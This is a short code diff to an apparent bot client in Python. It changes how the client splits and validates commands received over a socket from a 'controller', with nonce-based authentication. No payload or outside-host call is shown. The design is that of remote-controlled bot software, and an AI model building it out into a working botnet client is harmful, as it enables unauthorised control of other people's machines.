@@ -121,12 +121,16 @@ def client_program(args: str, sock: socket):
     # Receive the command that the controller has given to the bot
     command = sock.recv(1024).decode()
 
-    if(command == ''):
+    cmd_data = command.split()
+
+    if(command == '\n' or len(cmd_data) == 1):
+        return
+
+    if(len(cmd_data) == 0):
         print("lost connection.")
         main()
 
 
-    cmd_data = command.split()
     global commands_exe
     # Authenticate the command:
     if cmd_data[0] in seen_nonces:
